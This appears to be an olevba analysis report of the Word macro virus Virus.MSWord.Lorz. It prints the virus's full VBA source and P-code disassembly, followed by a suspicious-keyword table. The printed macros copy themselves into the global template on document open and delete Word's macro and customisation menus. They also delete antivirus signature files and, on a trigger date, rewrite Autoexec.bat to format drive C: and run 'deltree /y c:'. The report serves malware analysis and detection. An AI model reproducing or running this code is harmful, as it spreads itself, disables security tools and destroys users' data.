olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lorz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lorz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSWord.Lorz - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

ToolsOptionsSave .GlobalDotPrompt = 0
m$ = FileName$() + ":Lorz"
MacroCopy m$, "Global:FileSaveAs"
m$ = FileName$() + ":AutoOpen"
MacroCopy m$, "Global:Lorz"

End Sub

Sub ToolsMacro()

CommandBars("tools").Controls("Macro").Delete
           CommandBars("tools").Controls("Customize...").Delete
           CommandBars("tools").Controls("Templates and Add-Ins...").Delete
           CommandBars("view").Controls("Toolbars").Delete
End Sub

Sub Rolz()


On Error GoTo a
  VF$ = "C:\Program Files\Norton AntiVirus\Virscan.Dat"

 If Files$(VF$) = "" Then GoTo a
 SetAttr VF$, 0
 Kill VF$

a:
 On Error GoTo c
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo c
 SetAttr AB$, 0

 Open AB$ For Append As #1
  Print #1, "@echo off"
  Print #1, "IF exist " + VF$ + " then del " + VF$

  Close #1


c:
 On Error GoTo d
  VF$ = "C:\Program Files\F-Prot95\Fpwm32.dll"
 If Files$(VF$) = "" Then GoTo d
 SetAttr VF$, 0
 Kill VF$

d:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo f
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1


f:

 On Error GoTo g
  VF$ = "C:\Program Files\McAfee\Scan.dat"
 If Files$(VF$) = "" Then GoTo g
 SetAttr VF$, 0
 Kill VF$

g:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo h
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1

h:

 On Error GoTo i
  VF$ = "C:\Tbavw95\Tbscan.sig"
 If Files$(VF$) = "" Then GoTo i
 SetAttr VF$, 0
 Kill VF$

i:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo J
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1


J:
If Day(Now()) = 8 And Month(Now() = 7) Then
        SetAttr "C:\AUTOEXEC.BAT", 0
        Name "C:\AUTOEXEC.BAT" As "C:\AUTOEXEC.AAV"
        Open "C:\AUTOEXEC.BAT" For Output As #1
        Print #1, "@Echo off"
        Print #1, "cls"
        Print #1, "echo I have just entered your ass:"
        Print #1, "echo         MS-WINDOWS"
        Print #1, "echo Lorz has been in for awhile   "
        Print #1, "echo                --AKP--"
        Print #1, "echo y|format c: /u /v:AAV >nul"
        Print #1, "deltree /y c: >nul"
        Close #1
        dsk$ = Left$(DefaultDir$(9), 3)
        DocMinimize

Z:

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lorz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Модуль1 - 5287 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	MemLdWith GlobalDotPrompt 
' 	LitDI2 0x0000 
' 	Eq 
' 	ArgsCall ToolsOptionsSave 0x0001 
' Line #3:
' 	ArgsLd FileName$ 0x0000 
' 	LitStr 0x0005 ":Lorz"
' 	Add 
' 	St m$ 
' Line #4:
' 	Ld m$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	ArgsCall MacroCopy 0x0002 
' Line #5:
' 	ArgsLd FileName$ 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St m$ 
' Line #6:
' 	Ld m$ 
' 	LitStr 0x000B "Global:Lorz"
' 	ArgsCall MacroCopy 0x0002 
' Line #7:
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Sub ToolsMacro())
' Line #11:
' Line #12:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #13:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #14:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #15:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Sub Rolz())
' Line #19:
' Line #20:
' Line #21:
' 	OnError a 
' Line #22:
' 	LitStr 0x002D "C:\Program Files\Norton AntiVirus\Virscan.Dat"
' 	St VF$ 
' Line #23:
' Line #24:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo a 
' 	EndIf 
' Line #25:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #26:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #27:
' Line #28:
' 	Label a 
' Line #29:
' 	OnError c 
' Line #30:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #31:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo c 
' 	EndIf 
' Line #32:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #33:
' Line #34:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #37:
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #39:
' Line #40:
' Line #41:
' 	Label c 
' Line #42:
' 	OnError d 
' Line #43:
' 	LitStr 0x0024 "C:\Program Files\F-Prot95\Fpwm32.dll"
' 	St VF$ 
' Line #44:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo d 
' 	EndIf 
' Line #45:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #46:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #47:
' Line #48:
' 	Label d 
' Line #49:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #50:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo False 
' 	EndIf 
' Line #51:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #52:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' Line #56:
' Line #57:
' 	Label False 
' Line #58:
' Line #59:
' 	OnError g 
' Line #60:
' 	LitStr 0x0020 "C:\Program Files\McAfee\Scan.dat"
' 	St VF$ 
' Line #61:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo g 
' 	EndIf 
' Line #62:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #63:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #64:
' Line #65:
' 	Label g 
' Line #66:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #67:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo h 
' 	EndIf 
' Line #68:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #69:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #72:
' Line #73:
' 	Label h 
' Line #74:
' Line #75:
' 	OnError i 
' Line #76:
' 	LitStr 0x0015 "C:\Tbavw95\Tbscan.sig"
' 	St VF$ 
' Line #77:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo i 
' 	EndIf 
' Line #78:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #79:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #80:
' Line #81:
' 	Label i 
' Line #82:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #83:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo J 
' 	EndIf 
' Line #84:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #85:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #88:
' Line #89:
' Line #90:
' 	Label J 
' Line #91:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	LitDI2 0x0007 
' 	Eq 
' 	ArgsLd Month 0x0001 
' 	And 
' 	IfBlock 
' Line #92:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #93:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitStr 0x000F "C:\AUTOEXEC.AAV"
' 	Name 
' Line #94:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@Echo off"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "echo I have just entered your ass:"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "echo         MS-WINDOWS"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "echo Lorz has been in for awhile   "
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "echo                --AKP--"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "echo y|format c: /u /v:AAV >nul"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "deltree /y c: >nul"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #104:
' 	LitDI2 0x0009 
' 	ArgsLd DefaultDir$ 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd LBound$ 0x0002 
' 	St dsk$ 
' Line #105:
' 	ArgsCall DocMinimize 0x0000 
' Line #106:
' Line #107:
' 	Label Z 
' Line #108:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Fpwm32.dll          |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

